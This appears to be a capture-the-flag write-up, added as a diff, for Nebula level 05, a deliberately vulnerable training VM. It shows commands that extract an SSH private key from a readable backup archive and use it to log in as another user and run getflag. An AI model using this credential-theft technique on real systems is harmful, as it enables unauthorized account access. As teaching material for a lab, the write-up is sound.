@@ -1,0 +1,78 @@
+Question URL: https://exploit.education/nebula/level-05/
+
+Information gatehring:
+a. level05 user can read the .backup directory (drwxr-xr-x)
+level05@nebula:/home/flag05$ ls -al
+total 13
+drwxr-x--- 1 flag05 level05  100 2019-02-09 05:12 .
+drwxr-xr-x 1 root   root     140 2012-08-27 07:18 ..
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
+-rw------- 1 flag05 flag05   298 2019-02-09 05:13 .bash_history
+-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
+drwx------ 2 flag05 flag05    60 2019-02-09 04:59 .cache
+-rw------- 1 flag05 flag05    54 2019-02-09 05:09 .lesshst
+-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
+drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
+
+b. Within .back directory, level05 user has read access to the file of backu-19072011.tgz, where the user can extract the compressed file 
+somewhere level05 user can write.
+
+level05@nebula:/home/flag05/.backup$ ls -al
+total 2
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
+drwxr-x--- 1 flag05 level05  100 2019-02-09 05:12 ..
+-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
+
+c. Checking the content of backup-19072011.tgz. So it looks the backup file holds the ssh authorized_keys, 
+which allows a user specified in the authorized_keys file to log on SSH connections (NO password needed!)
+
+level05@nebula:/home/flag05/.backup$ tar tf backup-19072011.tgz
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+
+
+Sol.
+a. Extract backup-19072011.tgz file to /home/level05. You need -C option to specifiy an extracting directory
+level05@nebula:/home/flag05/.backup$ tar xzvf backup-19072011.tgz -C /home/level05
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+
+b. Make a ssh connection with the user, flag05
+level05@nebula:~/.ssh$ ssh flag05@localhost
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+
+      _   __     __          __
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ \/ __ \/ / / / / __ `/
+   / /|  /  __/ /_/ / /_/ / / /_/ /
+  /_/ |_/\___/_.___/\__,_/_/\__,_/
+
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log in, use the username of "levelXX" and password "levelXX", where
+XX is the level number.
+
+Currently there are 20 levels (00 - 19).
+
+
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '12.04 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+flag05@nebula:~$ getflag
+You have successfully executed getflag on a target account
+
+
